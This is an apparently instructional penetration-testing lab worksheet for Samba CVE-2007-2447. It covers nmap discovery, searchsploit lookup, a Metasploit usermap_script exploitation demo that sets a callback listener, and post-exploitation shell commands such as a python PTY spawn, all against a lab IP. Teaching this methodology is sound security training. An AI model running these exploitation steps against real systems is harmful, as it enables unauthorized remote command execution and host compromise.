## Phase 1 — Discovery & Service Identification (Evidence-First)

### Student task
1. Identify open ports **139/445**
2. Identify the service as SMB/Samba and gather:
   - service banner/version (if available)
   - OS hints
   - SMB dialect/capabilities (if available)

### Evidence to capture (screenshots or logs)
- A scan output showing 139/445 open
- Service/version fingerprints
- Any SMB scripts output (host info, domain/workgroup, etc.)
```
nmap -sS -sV -sC -A -O -p 445,139 192.168.56.103
```

## Phase 2 — Vulnerability Research (Professional References)
### What to research
- **CVE ID:** CVE-2007-2447
- **Affected versions:** Samba 3.0.0 – 3.0.25rc3
- **Core weakness class:** command injection / unsafe shell invocation
- **Key condition:** “username map script” and/or other external script calls in `smb.conf`

### Acceptable sources for a professional report
- Vendor advisory (Samba project)
- Government/National DB record (NVD)
- CVE record (cve.org)
- exploit database (exploit-db.com)

## Phase 3 — Risk & Impact Analysis 

### Sample risk statement (adaptable)
**Risk:** If the target runs a vulnerable Samba version with a relevant configuration path enabled, an attacker may execute commands remotely, potentially resulting in full host compromise.

### Impact 
- Unauthorized command execution
- Data exposure (files/shares)
- Pivot potential inside a network
- Business impact: confidentiality/integrity/availability

### Likelihood considerations
- Is the vulnerable configuration enabled?
- Is SMB exposed internally only or to untrusted networks?
- Are compensating controls present (segmentation, firewall rules, monitoring)?

## Phase 4: Identify a Matching Public Exploit (SearchSploit)
**Goal:** Map the confirmed service/version findings to a known vulnerability and locate relevant public exploit references **for documentation and controlled lab validation**.

**Action (student):**
- Use **SearchSploit** (Exploit-DB’s offline index) to look up entries for **CVE-2007-2447**.
- Record the **Exploit Title**, **Exploit-DB ID**, **platform**, and any **reliability notes**.

```
searchsploit --cve 2007-2447
```

## Phase 5: Controlled Exploitation Demo (Instructor-Led Metasploit)

**Goal:** Demonstrate impact **in a safe lab** by validating whether CVE-2007-2447 is exploitable on the target, while students focus on methodology, observation, and reporting.

### 4.1 Framework setup (conceptual)
- Start the Metasploit environment and ensure the lab network interface is correctly selected for callbacks.
- Confirm the attacker VM can reach the target VM over SMB (TCP 139/445).

### 4.2 Locate the appropriate module
- Use Metasploit search functionality to find a Samba module that corresponds to **CVE-2007-2447**.
- Verify the module description matches:
  - The CVE
  - The suspected Samba version/config prerequisites
  - The expected outcome (remote command execution / session)

### 4.3 Configure target & listener parameters (what they mean)
- **RHOSTS**: the *target* host IP (e.g., `<TARGET_IP>`).
- **LHOST**: the *attacker* host IP on the lab network (e.g., `<ATTACKER_IP>`).
- **LPORT** (if applicable): the callback port on the attacker for the session.

```msfdb run
search cve:2007 type:exploit samba
use exploit/multi/samba/usermap_script
options
set RHOSTS 192.168.56.103
set LHOST eth1
exploit
```
## Phase 6: Post-Exploitation: Minimal Validation Commands (Non-Destructive)

**Goal:** Confirm access and stabilize the interactive shell **without causing harm**.

### 5.1 Identity & context checks
Run *minimal* commands to confirm who/where you are:
- Current user / effective privileges (identity check)
- Current directory listing (basic situational awareness)

### 5.2 Capability check (optional)
- Check whether an interpreter (like Python) exists to improve shell interactivity.

### 5.3 Shell stabilization (conceptual)
If the session is a basic shell and an interpreter is available, demonstrate upgrading to a more interactive terminal experience (PTY) for:
- Better command history
- Proper CTRL+C behavior
- Cleaner output formatting

run some commands into the compromised shell
```whoami or id or ls 
which python
python -c ''import pty; pty.spawn("/bin/bash")'
```




